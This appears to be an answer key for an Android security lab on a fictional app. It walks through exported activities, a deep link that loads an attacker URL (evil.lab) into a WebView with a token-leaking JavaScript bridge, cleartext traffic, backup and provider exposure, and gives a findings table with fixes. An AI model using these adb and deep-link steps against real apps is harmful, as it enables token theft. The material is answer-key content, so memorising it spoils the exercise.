# Mobile lab answers

## 1. Exported components

`MainActivity` (launcher and `beril://open`), `DebugActivity` (no filter, explicitly exported), `TokenReceiver` (`com.beril.lab.PUSH_TOKEN`), and the `FileProvider` (authority `com.beril.lab.files`).

## 2. DebugActivity

It is exported with no permission. It reads the `dump` string extra and renders it. Any app can start it with arbitrary text, which is useful for UI injection and for confirming an exported debug surface.

```bash
adb shell am start -n com.beril.lab/.DebugActivity --es dump "hello"
```

## 3. Deep link

`beril://open?url=...` reads the `url` parameter and passes it straight to `web.loadUrl`. An attacker can load an arbitrary HTTP origin inside the app's WebView.

```bash
adb shell am start -a android.intent.action.VIEW -d "beril://open?url=https://evil.lab/"
```

## 4. Bridge

`token()` and `open(String)`. The bridge is registered on the WebView, so any page loaded in that WebView can call them.

## 5. Token

`tok_lab_7f3a9c`. If the WebView loads an attacker page, the page calls `BerilBridge.token()` and exfiltrates the token. The deep link makes this reachable without a second bug.

## 6. Cleartext

`app.lab.local` permits cleartext. The API base is `http://app.lab.local/api/`, so traffic and tokens can be read on the LAN.

## 7. Strings

`api_base` is HTTP, and `api_key` is embedded. The key may be a public client key, but it is worth checking what it unlocks.

## 8. Backup

`allowBackup=true` lets `adb backup` pull app data on a debuggable or consenting device. Tokens in SharedPreferences and files can leave the device.

## 9. Provider

`external-path path="."` exposes the whole external storage tree through the provider. With `exported=true` and grant URI permissions, another app can request broad paths.

## 10. Findings

| Finding | Severity | Fix |
|---|---|---|
| Deep link loads arbitrary URL into a bridged WebView | High | Allowlist origins, or validate the scheme and host |
| Exported DebugActivity with no permission | Medium | Add a permission or remove it from release |
| Cleartext API and embedded key | Medium | HTTPS only, move secrets server-side |
| `allowBackup=true` | Low | Set false or add backup rules |
| Exported provider with `external-path .` | Medium | Narrow the paths and require grants |

## Stretch notes

- A built APK gives binary XML; `apktool` is the practical next step.
- The receiver test needs a running emulator and the app installed.
- Frida hook: `Java.perform` then `Java.use("com.beril.lab.MainActivity$Bridge").token`.
- A custom scheme handler is where path traversal usually appears.
